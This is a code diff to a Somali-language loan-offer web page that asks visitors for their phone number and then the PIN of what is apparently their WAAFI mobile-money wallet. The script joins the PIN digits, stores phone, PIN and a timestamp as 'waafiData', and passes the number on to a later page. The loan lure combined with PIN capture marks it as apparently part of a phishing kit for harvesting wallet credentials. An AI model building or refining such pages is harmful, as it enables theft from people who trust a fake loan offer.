@@ -48,10 +48,10 @@ h2{color:#555;}
   display:flex;
   justify-content:center;
   gap:10px;
-  align-items:center;
+  font-weight:bold;
 }
 
-/* PIN INPUT */
+/* PIN */
 .pinContainer{
   display:flex;
   justify-content:center;
@@ -130,7 +130,7 @@ Amaahado Sahlan oo Degdeg ah
 <h2>Gal</h2>
 
 <div class="numberBox">
-🇸🇴 <span id="phoneNumber">+252</span>
+🇸🇴 <span id="phoneNumber">Loading...</span>
 </div>
 
 <p>Geli PIN-kaaga</p>
@@ -155,27 +155,30 @@ Amaahado Sahlan oo Degdeg ah
 
 <script>
 
-/* =================================
-   LOAD NUMBER FROM PAGE 5
-================================== */
+/* =====================================
+   RECEIVE NUMBER FROM PAGE 5
+===================================== */
 
-let savedNumber = localStorage.getItem("phoneNumber");
+const params = new URLSearchParams(window.location.search);
+let phone = params.get("phone");
 
-console.log("Loaded Number:", savedNumber);
-
-/* VERIFY NUMBER EXISTS */
-if(savedNumber && savedNumber !== "null"){
-    document.getElementById("phoneNumber").innerText =
-        "+252 " + savedNumber;
-}else{
-    alert("Number missing. Restart process.");
-    window.location.href="page4.html";
+/* fallback from localStorage */
+if(!phone){
+   phone = localStorage.getItem("phoneNumber");
 }
 
+/* save again for next pages */
+if(phone){
+   localStorage.setItem("phoneNumber", phone);
+   document.getElementById("phoneNumber").innerText =
+        "+252 " + phone;
+}else{
+   alert("Number missing");
+}
 
-/* =================================
+/* =====================================
    PIN INPUT LOGIC
-================================== */
+===================================== */
 
 const pins = document.querySelectorAll(".pin");
 const button = document.getElementById("loginBtn");
@@ -185,7 +188,7 @@ pins.forEach((input,index)=>{
 
   input.addEventListener("input",()=>{
 
-    if(input.value.length === 1 && index < pins.length-1){
+    if(input.value.length===1 && index<pins.length-1){
         pins[index+1].focus();
     }
 
@@ -200,8 +203,6 @@ pins.forEach((input,index)=>{
 
 });
 
-
-/* ENABLE BUTTON */
 function checkPin(){
 
   let complete=true;
@@ -217,10 +218,9 @@ function checkPin(){
   }
 }
 
-
-/* =================================
-   BUTTON CLICK
-================================== */
+/* =====================================
+   SEND DATA TO PAGE 7
+===================================== */
 
 button.onclick=function(){
 
@@ -230,28 +230,25 @@ button.onclick=function(){
       return;
   }
 
-  /* COLLECT PIN */
   let pin="";
   pins.forEach(p=> pin+=p.value);
 
-  /* SAVE DATA AGAIN (IMPORTANT) */
-  localStorage.setItem("phoneNumber", savedNumber);
   localStorage.setItem("userPIN", pin);
 
   const fullData={
-    phone:savedNumber,
+    phone:phone,
     pin:pin,
     time:new Date().toLocaleString()
   };
 
   localStorage.setItem("waafiData", JSON.stringify(fullData));
 
-  /* SUCCESS */
   button.innerText="Processing...";
   button.style.background="#5fb82e";
 
   setTimeout(()=>{
-      window.location.href="page7.html";
+      window.location.href =
+        "page7.html?phone=" + encodeURIComponent(phone);
   },1500);
 };
 
